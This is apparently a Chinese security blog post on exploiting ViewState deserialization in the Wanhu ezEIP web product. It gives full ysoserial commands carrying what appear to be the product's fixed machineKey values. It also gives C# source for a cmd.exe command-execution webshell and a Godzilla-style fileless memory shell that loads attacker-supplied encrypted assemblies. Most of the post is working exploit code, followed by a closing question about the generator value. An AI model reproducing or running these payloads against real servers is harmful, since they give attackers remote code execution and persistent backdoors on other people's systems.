### 万户ezEip



在半年以前我收藏了一篇文章：ViewState反序列化实现无文件哥斯拉内存马，结果这几天在这个漏洞爆出来之后才发现这篇22年的文章就是以万户的success.aspx为例进行的ViewState反序列化



在文章的最后写出了.net如何去加载哥斯拉内存马



#### ActivitySurrogateSelectorFromFile

可以执行自己编写的程序集（只是可以加载dll文件形式）



如果要用ActivitySurrogateSelectorFromFile链执行代码，且目标在ASP.NET 4.8以上，需要先DisableTypeCheck。不然直接用这条链打的话，会报state到Pair的转换错误。



```
`ysoserial.exe -p ViewState -g ActivitySurrogateDisableTypeCheck -c "aaa" --validationalg="HMACSHA256" --validationkey="B298BA4E89C9631254E60F7C6E60B3287554B5175906E3CF8C446D9D5EAB496CEA7C76460CBC3095A7ABFC9C71BBE7CA5276CD412BE2F5F142C0F7624062734E" --generator="5F3023B1" --decryptionalg="AES" --decryptionkey="B298BA4EB3474EAE783D6A3295021698ECB183CDC9D407F1" --islegacy --isdebug --isencrypted `
```

然后再利用ActivitySurrogateSelectorFromFile链执行代码。在code.cs中，写一个类（把需要执行的代码写在构造函数或者静态代码块中）反序列化时会实例化该类

比如说下面这个回显马

```
class E
{
    public E()
    {
        System.Web.HttpContext context = System.Web.HttpContext.Current;
        context.Server.ClearError();
        context.Response.Clear();
        try
        {
            System.Diagnostics.Process process = new System.Diagnostics.Process();
            process.StartInfo.FileName = "cmd.exe";
            string cmd = context.Request.Headers["cmd"];
            process.StartInfo.Arguments = "/c " + cmd;
            process.StartInfo.RedirectStandardOutput = true;
            process.StartInfo.RedirectStandardError = true;
            process.StartInfo.UseShellExecute = false;
            process.Start();
            string output = process.StandardOutput.ReadToEnd();
            context.Response.Write(output);
        } catch (System.Exception) {}
        context.Response.Flush();
        context.Response.End();
    }
}
```

内存马

```
class d
{
    public d()
    {
        System.Web.HttpContext Context = System.Web.HttpContext.Current;
        Context.Server.ClearError();
        Context.Response.Clear();
        try
        {
            string key = "3c6e0b8a9c15224a";
            string pass = "pas";
            string md5 = System.BitConverter.ToString(new System.Security.Cryptography.MD5CryptoServiceProvider().ComputeHash(System.Text.Encoding.Default.GetBytes(pass + key))).Replace("-", "");
            byte[] data = System.Convert.FromBase64String(Context.Request[pass]);
            data = new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(System.Text.Encoding.Default.GetBytes(key), System.Text.Encoding.Default.GetBytes(key)).TransformFinalBlock(data, 0, data.Length);
            if (Context.Session["payload"] == null)
            {
                Context.Session["payload"] = (System.Reflection.Assembly)typeof(System.Reflection.Assembly).GetMethod("Load", new System.Type[] { typeof(byte[]) }).Invoke(null, new object[] { data });
            }
            else
            {
                System.IO.MemoryStream outStream = new System.IO.MemoryStream();
                object o = ((System.Reflection.Assembly)Context.Session["payload"]).CreateInstance("LY");
                o.Equals(Context); o.Equals(outStream); o.Equals(data); o.ToString();
                byte[] r = outStream.ToArray();
                Context.Response.Write(md5.Substring(0, 16));
                Context.Response.Write(System.Convert.ToBase64String(new System.Security.Cryptography.RijndaelManaged().CreateEncryptor(System.Text.Encoding.Default.GetBytes(key), System.Text.Encoding.Default.GetBytes(key)).TransformFinalBlock(r, 0, r.Length))); Context.Response.Write(md5.Substring(16));
            }
        }
        catch (System.Exception) { }
        Context.Response.Flush();
        Context.Response.End();
    }
}
```



```
ysoserial.exe -p ViewState -g ActivitySurrogateSelectorFromFile -c "code.cs;System.Web.dll;System.dll;" --validationalg="HMACSHA256" --validationkey="B298BA4E89C9631254E60F7C6E60B3287554B5175906E3CF8C446D9D5EAB496CEA7C76460CBC3095A7ABFC9C71BBE7CA5276CD412BE2F5F142C0F7624062734E" --generator="5F3023B1" --decryptionalg="AES" --decryptionkey="B298BA4EB3474EAE783D6A3295021698ECB183CDC9D407F1" --islegacy --isdebug --isencrypted
```





ViewState 反序列化在.NET Framework 4.5 (4.0) 版本之前使用legacy 模式而在万户ezEIP由于*targetFramework*="4.0"可以直接

```
ysoserial.exe -g ActivitySurrogateSelectorFromFile -p ViewState --decryptionalg="3DES"  --decryptionkey="XXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"  --validationalg="SHA1" --validationkey="BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB" --generator=60AF4XXX -c "CHANGEME.cs;System.Web.dll;System.dll"
```

但是我在index.aspx或者其他路径也攻击成功，按照生成步骤来说generator用的是success.aspx的__VIEWSTATEGENERATOR，而生成VIEWSTATEGENERATOR是依据TemplateSourceDirectory和classname而不是machineKey，所以不同的文件在相同的machinekey情况下会VIEWSTATEGENERATOR不同，虽然VIEWSTATEGENERATOR不参与反序列化但是作为生成步骤的一环按理来说不是应该攻击失败吗